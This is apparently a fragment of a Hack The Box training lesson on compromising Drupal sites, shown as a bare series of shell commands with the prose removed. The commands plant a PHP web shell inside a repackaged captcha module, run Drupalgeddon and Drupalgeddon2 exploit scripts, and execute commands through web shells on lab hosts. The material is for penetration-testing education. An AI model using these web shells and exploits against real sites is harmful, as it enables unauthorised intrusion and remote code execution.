...
![](../imgs/basic_page_shell_7v2.webp)
...
```shell-session
swmpdnky@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
...
```shell-session
swmpdnky@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
...
```shell-session
swmpdnky@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
swmpdnky@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
...
```shell-session
swmpdnky@htb[/htb]$ mv shell.php .htaccess captcha
swmpdnky@htb[/htb]$ tar cvf captcha.tar.gz captcha/
...
```shell-session
swmpdnky@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
```shell-session
swmpdnky@htb[/htb]$ python2.7 drupalgeddon.py 
...
```shell-session
swmpdnky@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
...
```shell-session
swmpdnky@htb[/htb]$ python3 drupalgeddon2.py 
...
```shell-session
swmpdnky@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
...
```shell-session
swmpdnky@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
...
```shell-session
swmpdnky@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
![image](https://academy.hackthebox.com../imgs/burp.webp)
